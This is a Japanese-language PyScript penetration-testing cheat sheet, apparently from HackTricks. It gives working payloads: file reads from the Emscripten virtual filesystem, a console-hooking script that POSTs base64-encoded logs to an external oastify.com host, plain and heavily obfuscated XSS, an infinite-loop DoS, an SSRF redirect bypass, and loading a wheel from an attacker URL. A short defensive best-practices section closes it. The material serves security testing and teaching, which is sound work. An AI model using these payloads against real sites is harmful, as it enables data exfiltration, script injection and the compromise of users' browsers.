# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript ペンテスティングガイド

PyScriptは、PythonをHTMLに統合するために開発された新しいフレームワークで、HTMLと一緒に使用できます。このチートシートでは、ペネトレーションテストの目的でPyScriptを使用する方法を見つけることができます。

### Emscripten仮想メモリファイルシステムからのファイルのダンプ/取得:

`CVE ID: CVE-2022-30286`\
\
コード:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten仮想メモリファイルシステムのOOBデータ流出（コンソールモニタリング）](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
コード:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### クロスサイトスクリプティング (通常)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### クロスサイトスクリプティング (Python 難読化)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### クロスサイトスクリプティング (JavaScript 難読化)

Code:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS攻撃（無限ループ）

コード:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## 新しい脆弱性と技術 (2023-2025)

### 制御されていないリダイレクトによるサーバーサイドリクエストフォージェリ (CVE-2025-50182)

`urllib3 < 2.5.0` は、PyScriptに付属する**Pyodideランタイム内**で実行されるときに、`redirect`および`retries`パラメータを無視します。攻撃者がターゲットURLに影響を与えることができる場合、開発者が明示的に無効にした場合でも、Pythonコードがクロスドメインリダイレクトに従うように強制することができ、実質的にanti-SSRFロジックを回避します。
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
`urllib3 2.5.0` でパッチが適用されました – PyScript イメージ内のパッケージをアップグレードするか、`packages = ["urllib3>=2.5.0"]` で安全なバージョンを固定してください。詳細については公式の CVE エントリを参照してください。

### 任意のパッケージの読み込みとサプライチェーン攻撃

PyScript は `packages` リストに任意の URL を許可するため、設定を変更または注入できる悪意のあるアクターは、被害者のブラウザで **完全に任意の Python** を実行することができます：
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*純粋なPythonホイールのみが必要です – WebAssemblyのコンパイルステップは必要ありません。* 設定がユーザー制御されていないことを確認し、HTTPSおよびSRIハッシュを使用して自分のドメインに信頼できるホイールをホストしてください。

### 出力のサニタイズの変更 (2023+)

* `print()` は依然として生のHTMLを注入し、そのためXSSに対して脆弱です（上記の例）。
* 新しい `display()` ヘルパーは **デフォルトでHTMLをエスケープします** – 生のマークアップは `pyscript.HTML()` でラップする必要があります。
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
この動作は2023年に導入され、公式のBuilt-insガイドに文書化されています。信頼できない入力には`display()`を使用し、`print()`を直接呼び出すことは避けてください。

---

## 防御的ベストプラクティス

* **パッケージを最新の状態に保つ** – `urllib3 >= 2.5.0`にアップグレードし、サイトに付属するホイールを定期的に再構築します。
* **パッケージソースを制限する** – PyPI名または同一オリジンのURLのみを参照し、理想的にはサブリソース整合性（SRI）で保護します。
* **コンテンツセキュリティポリシーを強化する** – インラインJavaScript（`script-src 'self' 'sha256-…'`）を禁止し、注入された`<script>`ブロックが実行されないようにします。
* **ユーザー提供の`<py-script>` / `<script type="py">`タグを禁止する** – HTMLを他のユーザーにエコーする前にサーバーでサニタイズします。
* **ワーカーを隔離する** – ワーカーからDOMへの同期アクセスが必要ない場合は、`sync_main_only`フラグを有効にして`SharedArrayBuffer`ヘッダーの要件を回避します。

## 参考文献

* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
* [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)

{{#include ../../banners/hacktricks-training.md}}
